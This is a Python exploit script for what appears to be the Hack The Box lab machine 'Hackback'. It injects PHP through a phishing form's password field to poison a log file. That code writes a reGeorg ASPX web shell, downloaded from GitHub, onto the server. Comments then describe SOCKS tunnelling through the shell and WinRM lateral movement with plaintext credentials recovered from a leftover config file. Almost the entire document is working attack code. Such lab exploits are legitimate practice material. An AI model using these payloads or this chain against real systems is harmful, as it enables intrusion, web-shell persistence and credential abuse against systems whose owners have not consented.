#!/usr/bin/python3
# -*- coding: utf​-8​ -*-
__author__ = 'artikrh'
import requests, socket, base64
from hashlib import sha256
import netifaces as ni
from sys import exit
from urllib.parse import quote
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class hackback(object):
    def __init__(self, proxies='http://127.0.0.1:8080'):
        self.url = "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php"
        self.aspxurl = "https://raw.githubusercontent.com/sensepost/reGeorg/master/tunnel.aspx"
        self.session = sha256(ip.encode('ascii')).hexdigest()
        self.proxies = {'http':proxies}
        self.content = base64.b64encode((requests.get(self.aspxurl, verify=False).text).encode()).decode()
        self.phpcmd = quote("""<?php echo(file_put_contents('cyclone.aspx',base64_decode('{}')));?>""".format(self.content))

        ## Or you can upload .php files
        #self.phpcode = "PD9waHAKcHJpbnRfcihzY2FuZGlyKCIuLiIpKTsKZWNobyBmaWxlX2dldF9jb250ZW50cygiLi4vd2ViLmNvbmZpZy5vbGQiKTsKPz4K"
        #self.phpcmd = quote("""<?php echo(file_put_contents('cyclone.php',base64_decode('{}')));?>""".format(self.phpcode))

        ## I. Reset log file to its initial state
        self.req('init')
        ## II. Deliver malicious credentials in the hackthebox phishing site
        self.phish()
        ## III. Check log creation file
        print(self.req('list'))
        ## IV. Show log file content
        print(self.req('show'))
        ## V. Is Georg OK?
        print(requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/cyclone.aspx", verify=False).text)

        # wget https://raw.githubusercontent.com/sensepost/reGeorg/master/reGeorgSocksProxy.py
        # wget https://raw.githubusercontent.com/d0nkeys/redteam/master/lateral-movement/winrm-fs.rb
        # Set up /etc/proxychains.conf to 9050 (by default)
        # python reGeorgSocksProxy.py -l 127.0.0.1 -p 9050 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/cyclone.aspx
        # winrm (proxychains ruby winrm-fs.rb) with simple:ZonoProprioZomaro:-( (found from web.config.old) at http://10.10.10.128:5985/wsman

    def req(self, action):
        params = (
            ('action', action),
            ('site', 'hackthebox'),
            ('password', '12345678'),
            ('session', self.session)
        )
        return requests.get(self.url, params=params, allow_redirects=False, verify=False).text

    def phish(self):
        data = '_token=23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA&username=artikrh&password={}&submit='.format(self.phpcmd)
        headers = {'Content-Type':'application/x-www-form-urlencoded'}
        requests.post("http://www.hackthebox.htb", data=data, headers=headers, allow_redirects=False, verify=False)

def main():
    obj = hackback()

if __name__ == '__main__':
    try:
        ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        socket.gethostbyname('admin.hackback.htb')
        socket.gethostbyname('www.hackthebox.htb')
    except socket.error:
        print('[*] Missing admin.hackback.htb or www.hackthebox.htb entry in /etc/hosts. Exiting...')
        exit()
        print('[*] Failed to retrieve tun0 IP address. Is your VPN on?')
    except:
        exit()

    main()
